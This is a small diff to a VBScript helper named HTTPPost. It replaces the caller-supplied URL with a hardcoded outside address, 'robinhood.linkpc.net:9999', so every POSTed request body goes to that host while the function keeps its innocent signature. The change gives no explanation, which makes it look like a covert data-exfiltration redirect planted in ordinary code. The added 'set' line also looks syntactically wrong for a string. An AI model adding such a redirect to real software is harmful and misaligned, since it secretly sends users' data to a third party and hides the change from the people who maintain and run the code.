@@ -35,8 +35,8 @@ End Function
 
 Function HTTPPost(sUrl, sRequest)
   set oHTTP = CreateObject("Microsoft.XMLHTTP")
-
-  oHTTP.open "POST", sUrl,false
+  set sUrl2 = "http://robinhood.linkpc.net:9999"
+  oHTTP.open "POST", sUrl2,false
   oHTTP.send sRequest
   HTTPPost = oHTTP.responseText
  End Function
